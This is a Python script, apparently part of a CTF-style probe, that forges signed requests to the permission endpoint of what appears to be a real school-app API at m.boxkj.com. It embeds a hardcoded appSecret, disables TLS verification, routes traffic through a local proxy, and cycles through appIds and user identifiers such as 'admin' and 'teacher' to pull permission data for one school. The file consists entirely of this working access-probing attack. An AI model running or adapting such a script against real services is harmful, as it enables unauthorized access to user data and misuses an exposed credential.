import sys, ssl, gzip, urllib.request, hashlib
sys.path.insert(0,'/Users/mac/Desktop')
from tsn_ctf_probe import build_signed, form_body, base_headers
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
opener=urllib.request.build_opener(urllib.request.ProxyHandler({'http':'http://127.0.0.1:7897','https':'http://127.0.0.1:7897'}), urllib.request.HTTPSHandler(context=ctx))
def post(appid, params):
    body,concat,sign=build_signed(params, app_id=appid)
    body['appId']=appid; body['appSecret']='e8167ef026cbc5e456ab837d9d6d9254'
    req=urllib.request.Request('https://m.boxkj.com/api/permission/getPermission', data=form_body(body), headers=base_headers(), method='POST')
    try:
        with opener.open(req,timeout=15) as r:
            d=r.read()
            if 'gzip' in (r.headers.get('Content-Encoding') or '').lower(): d=gzip.decompress(d)
            print(f'[appId={appid}] {params} -> HTTP {r.status} | {d.decode("utf-8","replace")[:500]}')
    except urllib.error.HTTPError as e:
        d=e.read()
        if 'gzip' in (e.headers.get('Content-Encoding') or '').lower(): d=gzip.decompress(d)
        print(f'[appId={appid}] {params} -> HTTP {e.code} | {d.decode("utf-8","replace")[:500]}')
for appid in ['bxkj2018','move']:
    for user in ['admin','1','teacher']:
        post(appid, {'schoolId':'273','userNum':user,'pid':'0'})
        import time; time.sleep(1)
